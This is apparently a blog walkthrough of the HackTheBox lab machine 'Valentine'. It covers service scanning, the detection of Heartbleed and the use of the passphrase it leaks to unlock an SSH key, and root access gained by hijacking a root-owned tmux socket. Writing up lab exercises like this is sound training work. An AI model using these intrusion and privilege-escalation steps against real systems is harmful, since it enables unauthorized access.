---
title: HTB | Valentine
author: Zeropio
date: 2023-01-03
categories: [Pentesting, HackTheBox]
tags: [htb, windows, easy, machines]
permalink: /pentesting/htb/machines/valentine
image:
  path: /assets/img/hackthebox/card/Valentine.png
  width: 800
  height: 500
---

# Fingerprint

## Scan

The scan show:

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 964c51423cba2249204d3eec90ccfd0e (DSA)
|   2048 46bf1fcc924f1da042b3d216a8583133 (RSA)
|_  256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2023-01-03T18:04:27+00:00; 0s from scanner time.
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

### SSH

Some vulnerabilities can be found for the version:

```console
$ searchsploit OpenSSH 5.9                                 
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                              | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                        | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                          | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Doma | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading              | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                  | linux/remote/45939.py
---------------------------------------------------------------------- ---------------------------------
```

### Web

The same page can be found under both ports. 

```
http://10.10.10.79/ [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.10.10.79], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
https://10.10.10.79/ [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.10.10.79], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
```

Many vulnerabilities can be found for this PHP version:

```console
$ searchsploit php 5.3            
-------------------------------------------------- ---------------------------------
 Exploit Title                                    |  Path
-------------------------------------------------- ---------------------------------
4PSA VoIPNow Professional 2.5.3 - Multiple Vulner | php/webapps/18965.html
Aerohive HiveOS 5.1r5 < 6.1r5 - Multiple Vulnerab | php/webapps/34038.txt
Alienvault OSSIM/USM 5.3.1 - Persistent Cross-Sit | php/webapps/40683.txt
Alienvault OSSIM/USM 5.3.1 - PHP Object Injection | php/webapps/40682.txt
Alienvault OSSIM/USM 5.3.1 - SQL Injection        | php/webapps/40684.txt
Alienvault OSSIM/USM 5.3.4/5.3.5 - Remote Command | php/webapps/41884.rb
AlienVault OSSIM/USM < 5.3.1 - Remote Code Execut | php/webapps/41424.rb
. . . <SNIP> . . .
```

Fuzzing will show:

```
dev                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 51ms]
index                   [Status: 200, Size: 38, Words: 2, Lines: 2, Duration: 47ms]
server-status           [Status: 403, Size: 292, Words: 21, Lines: 11, Duration: 47ms]
                        [Status: 200, Size: 38, Words: 2, Lines: 2, Duration: 48ms]
encode                  [Status: 200, Size: 554, Words: 73, Lines: 28, Duration: 47ms]
index                   [Status: 200, Size: 38, Words: 2, Lines: 2, Duration: 50ms]
index.php               [Status: 200, Size: 38, Words: 2, Lines: 2, Duration: 50ms]
.                       [Status: 200, Size: 38, Words: 2, Lines: 2, Duration: 47ms]
decode.php              [Status: 200, Size: 552, Words: 73, Lines: 26, Duration: 53ms]
```

Under the **dev** folder we can found two file, **notes.txt**:

```
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

And **hype_key** with a bunch of hex encoding. For the HTTPS we have the same pages.

The encoder only do a base64 encoding. Trying to execute commands doesn’t seem to work

```
Your input:
"; id #
Your encoded input:
IjsgaWQgIw==
```

Decoding the hex give a RSA file, but we don’t have any user.

Back to the page, we can detect that it is vulnerable to XSS:

![Untitled](/assets/img/hackthebox/labs/valentine/Untitled.png)

We can try testing the HTTPS web. The command `sslscan` provides:

```console
$ sslscan https://10.10.10.79/
Version: 2.0.15-static
OpenSSL 1.1.1q-dev  xx XXX xxxx

Connected to 10.10.10.79

Testing SSL server 10.10.10.79 on port 443 using SNI name 10.10.10.79

  SSL/TLS Protocols:
SSLv2     disabled
SSLv3     enabled
TLSv1.0   disabled
TLSv1.1   disabled
TLSv1.2   disabled
TLSv1.3   disabled

  TLS Fallback SCSV:
Server does not support TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression disabled

  Heartbleed:

  Supported Server Cipher(s):

  SSL Certificate:
Signature Algorithm: sha1WithRSAEncryption
RSA Key Strength:    2048

Subject:  valentine.htb
Issuer:   valentine.htb

Not valid before: Feb  6 00:45:25 2018 GMT
Not valid after:  Feb  6 00:45:25 2019 GMT
```

But the nmap script:

```console
$ nmap --script=ssl-heartbleed.nse 10.10.10.79 -p443

PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://cvedetails.com/cve/2014-0160/
```

---

# Footprint

## Initial Access

Exploiting **Heartbleed** give us a base64, that decode says **heartbleedbelievethehype**. We can now use this text for the passprhase in the previous id_rsa. As the file is called **hype_key**, let’s try with that user:

```console
$ ssh hype@10.10.10.79 -i id_rsa -o 'PubkeyAcceptedKeyTypes +ssh-rsa' 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$
```

(We must do a little change because of the keys).

## Privilege Escalation

We can see a process running under root, `tmux`:

```console
hype@Valentine:~$ ps aux | grep tmux
root       1004  0.0  0.1  26416  1668 ?        Ss   09:59   0:03 /usr/bin/tmux -S /.devs/dev_sess
hype       5150  0.0  0.0  13576   924 pts/0    S+   12:20   0:00 grep --color=auto tmux
```

This session can be easily hijacked:

```console
hype@Valentine:~$ tmux -S /.devs/dev_sess

root@Valentine:/home/hype#
```
